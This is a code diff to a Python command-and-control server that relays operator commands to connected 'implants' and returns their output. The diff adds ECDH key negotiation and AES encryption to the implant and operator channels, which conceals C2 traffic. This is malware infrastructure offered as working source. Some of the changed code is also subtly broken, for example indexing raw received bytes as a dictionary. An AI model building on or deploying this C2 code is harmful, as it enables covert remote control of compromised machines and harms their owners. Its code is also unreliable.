@@ -6,6 +6,7 @@ from rich.console import Console
 import threading
 import time
 import json
+import src.crypto.ecdh as ecdh
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", required=True, help="The IP address for the server to listen on")
@@ -17,7 +18,7 @@ class MyServer():
     def __init__(self, HOST, PORT):
         self.LPHOST = str(HOST)
         self.LPPORT = int(PORT)
-        self.CMDHOST = '0.0.0.0'
+        self.CMDHOST = '127.0.0.1'
         self.CMDPORT = 10000
         self.console = Console()
         self.sockets = {
@@ -27,6 +28,21 @@ class MyServer():
         self.lp_connections = {}
         self.client_sockets = []
         self.cmd_connections = []
+
+    def negotiate_secret(self, conn):
+        key_gen = ecdh.key()
+        client_half = conn.recv(1024)
+        conn.send(str(key_gen.half_key).encode())
+        full_key = key_gen.gen_full(int(client_half.decode()))
+        return full_key
+    
+    def encrypt_msg(self, msg, full_key):
+        aes = ecdh.C2_AES(full_key)
+        return aes.encrypt(msg)
+
+    def decrypt_msg(self, encrypted_msg, full_key):
+        aes = ecdh.C2_AES(full_key)
+        return aes.decrypt(encrypted_msg)
     #function for handling Connections
     def lp_handle_connection(self, connection):
         implant_info = connection[0].recv(1024)
@@ -35,20 +51,29 @@ class MyServer():
         "connection" : connection[1],
         "info" : implant_info
         }
-        self.client_sockets.append(connection[0])
+        key_gen = ecdh.key()
+        connection[0].send(str(key_gen.half_key).encode())
+        aes_secret = key_gen.gen_full(int(implant_info['number']))
+        self.client_sockets.append((connection[0], aes_secret))
 
     def command_handle_connection(self, connection):
         self.cmd_connections.append(connection)
+        aes_key = self.negotiate_secret(connection[0])
         while True:
             data = connection[0].recv(1024)
+            data = self.decrypt_msg(data, aes_key)
             if data.decode() == "get_clients":
-                connection[0].send(json.dumps(self.lp_connections).encode())
+                msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
+                connection[0].send(msg)
             else:
                 data = json.loads(data.decode())
                 if 'command' in data:
-                    self.client_sockets[int(data['client_id'])].send(data["command"].encode())
-                    response = self.client_sockets[int(data['client_id'])].recv(50000)
-                    connection[0].send(response)
+                    msg = self.encrypt_msg(data["command"],self.client_sockets[int(data['client_id'])][1])
+                    self.client_sockets[int(data['client_id'])][0].send(msg)
+                    response = self.client_sockets[int(data['client_id'])][0].recv(50000)
+                    response = self.decrypt_msg(response, self.client_sockets[int(data['client_id'])][1])
+                    msg = self.encrypt_msg(response.decode(), aes_key)
+                    connection[0].send(msg)
     #function to bind socket to port
     def bind(self, sock, host, port):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
